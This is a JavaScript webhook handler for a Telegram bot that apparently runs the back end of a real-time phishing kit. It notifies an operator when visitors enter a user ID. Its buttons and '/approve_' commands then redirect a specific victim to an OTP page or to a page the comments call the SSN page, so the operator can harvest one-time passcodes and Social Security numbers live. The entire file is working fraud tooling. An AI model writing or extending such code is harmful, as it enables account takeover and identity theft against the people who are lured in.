// Telegram webhook endpoint
// Receives updates from Telegram and processes commands

import { sendTelegramMessage } from '../telegram';
import { getRecentActivities } from '../kv-client';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callback = update.callback_query;
      const data = callback.data;
      const chatId = callback.message.chat.id;
      const messageId = callback.message.message_id;
      
      console.log('[telegram] Received callback:', data);
      
      // Handle redirect buttons for visitor
      if (data.startsWith('redirect_')) {
        const redirectType = data.replace('redirect_', '');
        let pagePath = '/';
        
        if (redirectType === 'otp') {
          pagePath = '/otp';
        } else if (redirectType === 'ssn') {
          pagePath = '/personal'; // Assuming SSN page is personal page
        } else if (redirectType === 'login') {
          pagePath = '/';
        }
        
        console.log('[telegram] Processing redirect button:', redirectType, 'to', pagePath);
        
        // Extract visitor ID from message text (try multiple patterns)
        const messageText = callback.message.text || callback.message.caption || '';
        console.log('[telegram] Message text:', messageText);
        
        let visitorId = messageText.match(/Visitor ID: <code>(.*?)<\/code>/)?.[1] ||
                       messageText.match(/Visitor ID: (.*?)\n/)?.[1] ||
                       messageText.match(/Visitor ID: (.*?)$/m)?.[1];
        
        console.log('[telegram] Extracted visitor ID:', visitorId);
        
        // Answer callback query immediately (don't wait)
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const answerResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callback.id,
            text: `Redirecting to ${redirectType.toUpperCase()} PAGE`
          })
        });
        console.log('[telegram] Callback query answered:', await answerResponse.json());
        
        if (visitorId) {
          try {
            const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                           (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
            
            console.log('[telegram] Calling redirect/set API:', `${baseUrl}/api/redirect/set`);
            
            // Store redirect command (don't await - fire and forget for speed)
            fetch(`${baseUrl}/api/redirect/set`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                visitorId: visitorId,
                redirectType: redirectType,
                pagePath: pagePath
              })
            }).then(async (response) => {
              const result = await response.json();
              console.log('[telegram] Redirect set response:', result);
            }).catch(error => {
              console.error('[telegram] Error storing redirect:', error);
            });
          } catch (error) {
            console.error('[telegram] Error in redirect setup:', error);
          }
        } else {
          console.error('[telegram] Could not extract visitor ID from message');
          await sendTelegramMessage(
            `❌ Error: Could not find visitor ID in message`,
            chatId
          );
        }
        
        // Send confirmation message
        sendTelegramMessage(
          `✅ Redirecting visitor to ${redirectType.toUpperCase()} PAGE`,
          chatId
        ).catch(err => console.error('[telegram] Error sending confirmation:', err));
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle approve buttons for activities
      if (data.startsWith('approve_')) {
        const parts = data.split('_');
        const redirectType = parts[1]; // otp, ssn, login
        const activityId = parts.slice(2).join('_');
        
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: redirectType
            })
          });
          
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          if (approveResponse.ok) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `✅ Redirected to ${redirectType.toUpperCase()} PAGE`
              })
            });
            
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to ${redirectType.toUpperCase()} PAGE.`,
              chatId
            );
          } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback.id,
                text: `❌ Error approving`
              })
            });
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callback.id,
              text: `❌ Error: ${error.message}`
            })
          });
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    // Handle webhook updates from Telegram
    if (update.message) {
      const message = update.message;
      const text = message.text || '';
      const chatId = message.chat.id;
      
      console.log('[telegram] Received message:', text, 'from chat:', chatId);
      
      // Handle /start command
      if (text.startsWith('/start')) {
        await sendTelegramMessage(
          '🤖 Bot activated!\n\n' +
          'You will receive notifications when users enter their User ID.\n' +
          'Use /approve_<activityId> to approve and redirect to OTP page.',
          chatId
        );
        return res.status(200).json({ ok: true });
      }
      
      // Handle /approve_<activityId> command
      if (text.startsWith('/approve_')) {
        const activityId = text.replace('/approve_', '').trim();
        
        if (!activityId) {
          await sendTelegramMessage('Usage: /approve_<activityId>', chatId);
          return res.status(200).json({ ok: true });
        }
        
        try {
          // Call internal approve API
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const approveResponse = await fetch(`${baseUrl}/api/approve`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              activityId: activityId,
              redirectType: 'otp'
            })
          });
          
          if (approveResponse.ok) {
            await sendTelegramMessage(
              `✅ Approved activity ${activityId}\nUser redirected to OTP page.`,
              chatId
            );
          } else {
            await sendTelegramMessage(
              `❌ Error approving activity ${activityId}`,
              chatId
            );
          }
        } catch (error) {
          console.error('[telegram] Error approving:', error);
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
      
      // Handle /activities command
      if (text === '/activities') {
        try {
          const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
                         (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
          
          const activitiesResponse = await fetch(`${baseUrl}/api/activities`);
          const activitiesData = await activitiesResponse.json();
          
          if (activitiesData.success && activitiesData.activities && activitiesData.activities.length > 0) {
            let message = '📋 <b>Recent Activities:</b>\n\n';
            activitiesData.activities.slice(0, 5).forEach(activity => {
              message += `ID: <code>${activity.id}</code>\n`;
              message += `User: <code>${activity.userId || 'N/A'}</code>\n`;
              message += `Type: ${activity.type}\n`;
              message += `/approve_${activity.id}\n\n`;
            });
            await sendTelegramMessage(message, chatId);
          } else {
            await sendTelegramMessage('No activities found.', chatId);
          }
        } catch (error) {
          await sendTelegramMessage(`❌ Error: ${error.message}`, chatId);
        }
        
        return res.status(200).json({ ok: true });
      }
    }
    
    return res.status(200).json({ ok: true });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

